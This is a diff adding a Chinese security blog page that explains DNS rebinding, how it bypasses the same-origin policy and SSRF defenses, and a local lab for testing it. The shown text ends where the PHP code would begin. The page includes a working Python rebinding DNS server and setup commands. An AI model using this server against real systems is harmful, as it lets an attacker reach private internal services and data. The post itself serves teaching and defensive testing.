@@ -1,0 +1,2426 @@
+<!DOCTYPE html>
+<html lang="">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="keacwu">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="keacwu">
+    
+    <meta name="keywords" content="Loongten,keac,Security,网络安全,安全,信息安全,ctf">
+    
+    <meta name="description" content="A Network Security Amateur">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>dns rebinding bypass · keac&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdn.staticfile.org/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdn.staticfile.org/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <script>
+        var _hmt = _hmt || [];
+        (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?e945c94a656398fe4d324091cf464418";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+    
+    <!-- 谷歌统计  -->
+    
+    <script>
+        (function (i, s, o, g, r, a, m) {
+        i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
+        (i[r].q = i[r].q || []).push(arguments)
+        }, i[r].l = 1 * new Date(); a = s.createElement(o),
+        m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
+        })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+        ga('create', 'UA-75902620-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >keac&#39;s Bolg.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">dns rebinding bypass</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>keac's Bolg.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            dns rebinding bypass
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">4.5k</span>阅读时长: <span class="post-count reading-time">17 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/02/26</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>DNS Rebinding (DNS重绑定攻击) 是一个比较早就出现的漏洞，被广泛用于bypass同源策略，绕过ssrf的过滤等等。</p>
+<h1 id="DNS-Rebinding-原理"><a href="#DNS-Rebinding-原理" class="headerlink" title="DNS Rebinding 原理"></a>DNS Rebinding 原理</h1><p>讲到 DNS Rebinding，就得先了解下DNS</p>
+<h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p>DNS是Domain Name Service的缩写,计算机域名服务器,在Internet上域名与IP地址之间是一一对应的，域名虽然便于人们记忆，但机器之间只能互相认识IP地址，它们之间的转换工作称为域名解析，而域名解析需要由专门的域名解析服务器来完成，这就是DNS域名服务器。</p>
+<p>更多详细的关于dns原理可以看 <a href="http://www.ruanyifeng.com/blog/2016/06/dns.html" target="_blank" rel="noopener">阮一峰老师写的DNS 原理入门</a></p>
+<p>这里来讲几个DNS的点</p>
+<h3 id="DNS-TTL"><a href="#DNS-TTL" class="headerlink" title="DNS TTL"></a>DNS TTL</h3><p>TTL值全称是“生存时间（Time To Live)”，简单的说它表示DNS记录在DNS服务器上缓存时间，数值越小，修改记录各地生效时间越快。</p>
+<p>当各地的DNS(LDNS)服务器接受到解析请求时，就会向域名指定的授权DNS服务器发出解析请求从而获得解析记录；该解析记录会在DNS(LDNS)服务器中保存一段时间，这段时间内如果再接到这个域名的解析请求，DNS服务器将不再向授权DNS服务器发出请求，而是直接返回刚才获得的记录；而这个记录在DNS服务器上保留的时间，就是TTL值。</p>
+<p>常见的设置TTL值的场景</p>
+<p><strong>增大TTL值，以节约域名解析时间</strong></p>
+<blockquote>
+<p>通常情况下域名解析记录是很少更改的。我们可以通过增大域名记录的TTL值让记录在各地DNS服务器中缓存的时间加长，这样在更长的时间段内，我们访问这个网站时，本地ISP的DNS服务器就不需要向域名的NS服务器发出解析请求，而直接从本地缓存中返回域名解析记录,从而提高解析效率。TTL值是以秒为单位的，通常的默认值都是3600，也就是默认缓存1小时。我们可以根据实际需要把TTL值扩大，例如要缓存一天就设置成86400。</p>
+</blockquote>
+<p><strong>减小TTL值，减少更新域名记录时的不可访问时间</strong></p>
+<blockquote>
+<p>更换空间因为TTL缓存的问题，新的域名记录，在有的地方可能生效了，有的地方可能等上一两天甚至更久才生效。结果就是有的人访问到了新服务器，有的人访问到了旧服务器。如果原来的域名TTL值设置的小，各地的ISP域名缓存服务器服务器就会很快的访问你域名的权威DNS解析服务器，尽快把你域名的DNS解析IP返回给查询者。</p>
+</blockquote>
+<h2 id="浏览器同源策略"><a href="#浏览器同源策略" class="headerlink" title="浏览器同源策略"></a>浏览器同源策略</h2><p>为了更好地理解DNS重绑定的工作方式，首先要了解它所避开的安全机制： Web浏览器的同源策略。</p>
+<p>按照百度百科的说法就是：同源策略（Same origin policy）是一种约定，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，则浏览器的正常功能可能都会受到影响。可以说Web是构建在同源策略基础之上的，浏览器只是针对同源策略的一种实现。</p>
+<p>其实换句话来说就是在浏览器中，同一个域名下的网站只能调用本域名下的资源。就好比说现在有一个网址 <a href="http://www.test.com/index/" target="_blank" rel="noopener">http://www.test.com/index/</a> 的页面，在同源策略的约束下可以调用 <a href="http://www.test.com/index2/" target="_blank" rel="noopener">http://www.test.com/index2/</a> 的资源，但是不能调用 <a href="http://www.sdfdsf.com/index/" target="_blank" rel="noopener">http://www.sdfdsf.com/index/</a> 的资源，仅有两个例外，<code>&lt;script&gt;</code>,<code>&lt;link&gt;</code>,<code>&lt;iframe&gt;</code>,<code>&lt;img&gt;</code>等标签的SRC属性，发送到任何域的POST请求。</p>
+<p>同源策略最直接的表现就是能够区分出各个网站的cookie信息，使得我们能够有条不紊的访问各个网站而不会照成信息混乱。</p>
+<h2 id="DNS-Rebinding"><a href="#DNS-Rebinding" class="headerlink" title="DNS Rebinding"></a>DNS Rebinding</h2><p>让我们考虑一下，如果我们设法消除对第三方域数据的限制，有什么可以实现的攻击方法。</p>
+<p>首先，这不仅使我们有可能向第三方资源发送请求（如在传统的CSRF攻击中一样），而且还可以处理来自服务器的响应。 结果，大多数旨在确保免受CSRF攻击保护的机制都将失败。 此外，我们可以访问用户本地网络中的资源，即通过使用用户浏览器作为代理无法从外部访问的资源。 此外，我们可以从需要用户证书进行授权的资源中接收机密信息。 </p>
+<p>当然，我们都知道在网络攻击形式中，是可以通过恶意网页调用受害者本地资源来进行的。然而在上述所讲的同源策略约束下，从理论上来说浏览器打开的网页是无法访问运行本地的恶意脚本的，这能够保证我们上网过程中，本地资源得到安全保护。</p>
+<p>但是在实际中，同源策略的约束可以被轻松绕过，比如说域名重新绑定攻击就可以轻松的绕过SOP（浏览器同源策略）。</p>
+<p>在网页浏览过程中，用户在地址栏中输入包含域名的网址。浏览器通过DNS服务器将域名解析为IP地址，然后向对应的IP地址请求资源，最后展现给用户。</p>
+<p>域名 =&gt; 公共DNS服务器=&gt; IP </p>
+<p>而对于域名所有者，他可以设置域名所对应的IP地址。</p>
+<p>当用户第一次访问，解析域名获取一个IP地址</p>
+<p>127.0.0.1.ssrf.loongten.com =&gt; 123.123.123.123</p>
+<p>一般来说我们的操作系统默认能够将DNS返回来的这个IP地址信息保存60秒，而超过60秒后如果需要再次访问这个域名，就会重新去请求一次dns</p>
+<p>域名持有者修改对应的IP地址,用户再次请求该域名，获取一个新的IP地址,如127.0.0.1。</p>
+<p>127.0.0.1.ssrf.loongten.com  =&gt; 127.0.0.1</p>
+<p>现在再去调用 127.0.0.1.ssrf.loongten.com 已经变成了本地的资源，对于浏览器来说，整个过程访问的都是同一域名，所以这样其实还是符合浏览器的同源策略，却非法的调用到了PC的本地资源。这样的行为被称之为域名重新绑定攻击（DNS ReBinding）。</p>
+<h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><ol>
+<li>攻击者引诱受害者打开域名，比如钓鱼、存储型XSS</li>
+<li>从DNS服务器接收与域名对应的IP地址</li>
+<li>受害者打开当前域名对应的web服务，接受JavaScript脚本。</li>
+<li>一段时间后，JavaScript脚本向服务器发起重复请求。</li>
+<li>此时，攻击者使用防火墙阻止所有受害者对服务器的请求。</li>
+<li>浏览器再次尝试通过发送相应的DNS请求来获取服务器的IP地址。 这次，它从受害者的本地网络接收易受攻击的服务器的IP地址。</li>
+<li>利用WebRTC </li>
+<li>使用批量地址结合域名转换实现内网扫描</li>
+</ol>
+<p>DNS重新绑定允许远程攻击者绕过受害者的网络防火墙，并使用其Web浏览器作为代理，直接与其私有网络上的设备进行通信。</p>
+<p>DNS rebinding被广泛用于bypass同源策略，绕过ssrf的过滤等等。</p>
+<h1 id="技术实现"><a href="#技术实现" class="headerlink" title="技术实现"></a>技术实现</h1><p>在上述内容中，了解了什么是域名重新绑定攻击，重点在于DNS服务能够在两次DNS查询中返回不用的IP地址，第一次是真正的IP，第二次是攻击目标IP地址。那么如何实现公共DNS服务器下能够返回自定义信息呢？</p>
+<ol>
+<li>实现方法一：特定域名实现</li>
+<li>实现方法二：简单粗暴的两条A记录</li>
+<li>实现方法三：自建DNS服务器</li>
+</ol>
+<h2 id="Ceye"><a href="#Ceye" class="headerlink" title="Ceye"></a>Ceye</h2><p>ceye上已经有了DNS Rebinding功能，直接可以用</p>
+<p><img src="1.png" alt="dns-rebinding-bypass"></p>
+<p>ceye说会 “the dns answer section will randomly return one of them，有点不靠谱</p>
+<p><img src="2.png" alt="dns-rebinding-bypass"></p>
+<p><img src="3.png" alt="dns-rebinding-bypass"></p>
+<p>不是稳定的两个IP交替，这种情况下就是撞运气了。如果能达到第一次访问的是144.x.x.x这个外网地址，第二次访问的是 127.0.0.1，成功的希望就大了一些。</p>
+<p>不是很建议使用ceye的这个DNS Rebinding，尝试中单位时间内好多次都访问了同一个IP。感觉这个切换率还不如同域名绑定两个 ANAME 呢。</p>
+<h2 id="自建"><a href="#自建" class="headerlink" title="自建"></a>自建</h2><h3 id="准备域名"><a href="#准备域名" class="headerlink" title="准备域名"></a>准备域名</h3><p>首先你得有一个域名，从某云买或者 <a href="http://www.freenom.com" target="_blank" rel="noopener">www.freenom.com</a> 搞一个免费的 tk 域名</p>
+<h3 id="搭建dns服务器"><a href="#搭建dns服务器" class="headerlink" title="搭建dns服务器"></a>搭建dns服务器</h3><p><img src="4.png" alt="dns-rebinding-bypass"></p>
+<p>此时，当访问ssrf.loongten.com域名，先解析该域名的DNS域名为 nst.loongten.com，nst.loongten.com指向139这台服务器。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from twisted.internet import reactor, defer</span><br><span class="line">from twisted.names import client, dns, error, server</span><br><span class="line">record&#x3D;&#123;&#125;</span><br><span class="line">class DynamicResolver(object):</span><br><span class="line">    def _doDynamicResponse(self, query):</span><br><span class="line">        name &#x3D; query.name.name</span><br><span class="line">        if name not in record or record[name]&lt;1:</span><br><span class="line">            ip &#x3D; &quot;114.114.114.114&quot;</span><br><span class="line">        else:</span><br><span class="line">            ip &#x3D; &quot;127.0.0.1&quot;</span><br><span class="line">        if name not in record:</span><br><span class="line">            record[name] &#x3D; 0</span><br><span class="line">        record[name] +&#x3D; 1</span><br><span class="line">        print name + &quot; &#x3D;&#x3D;&#x3D;&gt; &quot; + ip</span><br><span class="line">        answer &#x3D; dns.RRHeader(</span><br><span class="line">            name &#x3D; name,</span><br><span class="line">            type &#x3D; dns.A,</span><br><span class="line">            cls &#x3D; dns.IN,</span><br><span class="line">            ttl &#x3D; 0,</span><br><span class="line">            payload &#x3D; dns.Record_A(address &#x3D; b&#39;%s&#39; % ip, ttl&#x3D;0)</span><br><span class="line">        )</span><br><span class="line">        answers &#x3D; [answer]</span><br><span class="line">        authority &#x3D; []</span><br><span class="line">        additional &#x3D; []</span><br><span class="line">        return answers, authority, additional</span><br><span class="line">    def query(self, query, timeout&#x3D;None):</span><br><span class="line">        return defer.succeed(self._doDynamicResponse(query))</span><br><span class="line">def main():</span><br><span class="line">    factory &#x3D; server.DNSServerFactory(</span><br><span class="line">        clients&#x3D;[DynamicResolver(), client.Resolver(resolv&#x3D;&#39;&#x2F;etc&#x2F;resolv.conf&#39;)]</span><br><span class="line">    )</span><br><span class="line">    protocol &#x3D; dns.DNSDatagramProtocol(controller&#x3D;factory)</span><br><span class="line">    reactor.listenUDP(53, protocol)</span><br><span class="line">    reactor.run()</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    raise SystemExit(main())</span><br></pre></td></tr></table></figure>
+
+<p> 注1：此脚本可以做到第一次请求解析记录时返回第一个外网 IP，第二次请求解析记录的时候返回一个第二个内网 IP。</p>
+<p>注2：里面ttl设为了0。</p>
+<p> 在终端中运行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install twisted</span><br><span class="line">sudo python dns_server.py</span><br></pre></td></tr></table></figure>
+
+<p>不过在ubuntu中，可能会遇到53端口被占用情况，可以尝试 </p>
+<p><code>service systemd-resolved stop</code></p>
+<p><img src="5.png" alt="dns-rebinding-bypass"></p>
+<p>注：有时候也会两次解析到第一个外网IP，后面都解析到第二个内网或主机IP。多尝试几次就好。</p>
+<h2 id="绕过SSRF-IP限制"><a href="#绕过SSRF-IP限制" class="headerlink" title="绕过SSRF IP限制"></a>绕过SSRF IP限制</h2><p><a href="https://www.loongten.com/2020/02/27/pentest-ssrf/">SSRF服务器端请求伪造原理</a></p>
+<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>一般SSRF漏洞的解决方案如下</p>
+<ol>
+<li><p>解析目标URL，获取其Host</p>
+</li>
+<li><p>解析Host，获取Host指向的IP地址</p>
+</li>
+<li><p>判断是否是内网IP，是内网IP直接return，不再往下执行</p>
+</li>
+<li><p>请求URL</p>
+</li>
+<li><p>如果有跳转，拿出跳转URL，执行1</p>
+</li>
+<li><p>正常的业务逻辑里，当判断完成最后会去请求URL，实现业务逻辑。</p>
+</li>
+</ol>
+<p>这种处理流程真的能避免 SSRF 吗？</p>
+<p>可以避免的有：</p>
+<ol>
+<li><p>直接访问内网 IP</p>
+</li>
+<li><p>302 跳转</p>
+</li>
+<li><p>xip.io/xip.name 及短链接变换等 URL 变形</p>
+</li>
+<li><p>畸形 URL</p>
+</li>
+<li><p>iframe 攻击</p>
+</li>
+<li><p>IP 进制转换  </p>
+</li>
+</ol>
+<h3 id="绕过原理"><a href="#绕过原理" class="headerlink" title="绕过原理"></a>绕过原理</h3><p>看起来似乎很完美，但是还有一种攻击可以绕过此种处理流程，就是 DNS Rebinding Attack。</p>
+<p>在上面的SSRF漏洞解决方案中，会发起DNS请求的步骤为，第2、4、6步，看来至少要请求3次。因为第6步至少会执行1次DNS请求。</p>
+<p>首先，修复逻辑中第2步发起DNS请求，DNS服务器返回一个外网IP，通过验证，执行到第四步。</p>
+<p>接着，修复逻辑中第4步会发起DNS请求，DNS服务器返回一个内网IP。此时，SSRF已经产生。</p>
+<p>观察到，在这个流程中，一共进行了两次DNS解析：第一次是对URL的host进行DNS解析，第二次是使用CURL发包的时候进行解析。这两次DNS解析是有时间差的，我们可以使用这个时间差进行绕过。</p>
+<p>事件差对应的DNS中的机制是TTL。TTL表示DNS里面域名和IP绑定关系的Cache在DNS上存活的最长时间。即请求了域名与iP的关系后，请求方会缓存这个关系，缓存保持的时间就是TTL。而缓存失效后就会删除，这时候如果重新访问域名指定的IP的话会重新建立匹配关系及cache。</p>
+<p>在上面的流程中，如果在DNS第二次解析的时候，我们能够更换URL对应的IP，那么在TTL之后、缓存失效之后，重新访问此URL的话，就能获取被更换后的IP。如果我们把第一次解析的IP设为合法IP，就能绕过host合法性检查了；把第二次解析的IP设为内网IP，就达到了SSRF访问内网的目的。</p>
+<h4 id="TTL"><a href="#TTL" class="headerlink" title="TTL"></a>TTL</h4><p>TTL 最理想的设置是0，即在第一次解析之后，立马换位我们想要访问的内网IP。</p>
+<p>但是现实是：现在国内购买的域名大都无法直接将TTL设置为0，例如阿里云的域名，最小的TTL是10分钟。而某些国外的域名解析商可以设置TTL=0。</p>
+<p>在实战中我们还可能遇到 DNS 缓存的问题。即使我们在前面实现的时候设置了TTL为0，但是有些公共DNS服务器，比如114.114.114.114还是会把记录进行缓存，完全不按照标准协议来，遇到这种情况是无解的。但是8.8.8.8是严格按照DNS协议去管理缓存的，如果设置TTL为0，则不会进行缓存。</p>
+<p>这种情况只能看命了。</p>
+<p>另一个利用是否成功的因素取决于目标网站的业务逻辑中的 TTL：</p>
+<ul>
+<li><p>Java默认不存在被DNS Rebinding绕过风险（TTL默认为10）</p>
+</li>
+<li><p>PHP默认会被DNS Rebinding绕过</p>
+</li>
+<li><p>Linux默认不会进行DNS缓存</p>
+</li>
+</ul>
+<h3 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h3><p>这里用PHP环境来实现漏洞</p>
+<p>参考下大佬写的<a href="https://github.com/chengable/safe_code/blob/master/ssrf_check.php" target="_blank" rel="noopener">php ssrf检查</a>，我们改一改，可以更直观的显示出当前状态。</p>
+<p>首先，我们写个node脚本，监听127.0.0.1 来模拟真实环境的内部机器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">var http &#x3D; require(&#39;http&#39;);</span><br><span class="line">var querystring &#x3D; require(&#39;querystring&#39;);</span><br><span class="line">var host &#x3D; &#39;127.0.0.1&#39;; &#x2F;&#x2F;地址</span><br><span class="line">var port &#x3D; &#39;1666&#39;; &#x2F;&#x2F;端口</span><br><span class="line">var server &#x3D; http.createServer(function(request,response)&#123;</span><br><span class="line">		response.statusCode &#x3D; 200;</span><br><span class="line">		response.write(&quot;This is a user Key:sdfjdsofjisdof&quot;);</span><br><span class="line">		response.end();</span><br><span class="line">&#125;);</span><br><span class="line">server.listen(port, host, function () &#123;</span><br><span class="line">	console.log(&quot;[!] ^_^&quot;);</span><br><span class="line">	console.log(&quot;[*] nodejs server start!&quot;);</span><br><span class="line">	console.log(&quot;[+] address: http:&#x2F;&#x2F;&quot;+host+&quot;:&quot;+port);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p><img src="6.png" alt="dns-rebinding-bypass"></p>
+<p>在本地我们有个重要业务，存放在user key</p>
+<p><img src="7.png" alt="dns-rebinding-bypass"></p>
+<p>php 环境代码</p>
